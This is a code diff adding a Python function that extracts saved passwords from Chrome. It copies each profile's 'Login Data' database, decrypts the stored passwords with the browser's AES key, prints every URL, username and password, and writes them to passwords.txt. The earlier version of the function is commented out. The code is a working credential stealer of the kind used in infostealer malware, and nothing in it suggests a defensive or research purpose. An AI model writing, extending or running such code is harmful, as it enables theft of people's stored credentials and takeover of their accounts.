@@ -71,9 +71,38 @@ def decrypt_passes(encrypted_password, key):
         
     except:
         return "[Dedcryption Fauiled]"
-     
 
 
+
+def extract_passwords_from_profiles():
+    user_data_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
+    key = get_aes()
+    output_lines = []
+    for folder in os.listdir(user_data_path):
+        profile_path = os.path.join(user_data_path, folder)
+        db_path = os.path.join(profile_path, "Login Data")
+        if folder.startswith("Profile") and os.path.isfile(db_path):
+            header = f"\nExtracting from: {folder}\n{'='*40}"
+            print(header)
+            output_lines.append(header)
+            # Use the correct db_path for each profile
+            db_file = "dbcopy.db"
+            shutil.copy(db_path, db_file)
+            entries = read_db(db_file)
+            for origin_url, username_value, password_value in entries:
+                dec_pass = decrypt_passes(password_value, key)
+                if username_value or dec_pass:
+                    entry = f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}"
+                    print(entry)
+                    output_lines.append(entry)
+            os.remove(db_file)
+    # Write all output to a file
+    with open("passwords.txt", "w", encoding="utf-8") as f:
+        f.write("\n".join(output_lines))
+
+  
+
+'''
 def extract_passwords_from_profiles():
     user_data_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
     key = get_aes()
@@ -91,7 +120,7 @@ def extract_passwords_from_profiles():
             os.remove(db_file)
 
 
-
+'''
 if __name__ == "__main__":
     extract_passwords_from_profiles()
 
